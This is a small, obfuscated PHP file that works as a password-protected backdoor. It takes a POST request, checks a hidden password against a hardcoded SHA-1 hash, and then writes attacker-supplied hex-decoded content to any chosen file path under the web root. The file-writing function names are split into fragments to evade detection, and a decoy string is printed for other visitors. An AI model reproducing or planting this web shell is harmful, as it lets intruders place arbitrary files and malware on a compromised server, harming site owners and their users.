<?php
$dsh = $_POST;
if(!empty($dsh['b']) && sha1($dsh['b'])=='5152f9348705e9a3645e9c9055bddef7d62ada27') {
	$jwk = $dsh['f'];
	if(!empty($dsh['r'])) $jwk = $_SERVER['DOCUMENT_ROOT'].'/'.$jwk;
	$ldz = 'f'.'ile_p'.'ut_co'.'ntents'; $tjn = 'h'.'ex'.'2'.'bin';
	if($ldz($jwk, $tjn($dsh['c']))) exit($jwk);
}
echo 'm26';
?>